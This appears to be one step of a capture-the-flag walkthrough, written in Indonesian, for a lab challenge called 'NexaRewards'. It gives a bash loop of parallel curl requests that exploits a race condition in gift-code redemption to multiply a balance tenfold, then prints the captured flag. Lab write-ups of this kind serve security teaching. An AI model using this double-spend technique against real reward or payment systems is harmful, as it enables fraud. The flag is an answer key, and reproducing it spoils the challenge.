# NexaRewards — Cara mendapatkan flag

[← Overview](70-nexarewards.md) · [Index](index.md)

> **Langkah 2/5.** Sepuluh request redeem paralel menaikkan saldo $60 menjadi $600.
>
> **Berikutnya:** [Flag](70-nexarewards-03-flag.md)

```bash
for i in $(seq 1 10); do
  curl -sS -b cookies -d 'code=NEXA-RACE-60' "$HOST/redeem" &
done
wait
```

Pengecekan "kode belum dipakai" dan penambahan saldo tidak atomik, jadi beberapa request lolos bersamaan.

```bash
curl -sS -b cookies -d 'item_id=audit-report' "$HOST/store/buy" | grep NFX
```

```text
NFX{r4c3_c0nd1t10n_g1ft_c4rd_d0ubl3_sp3nd}
```
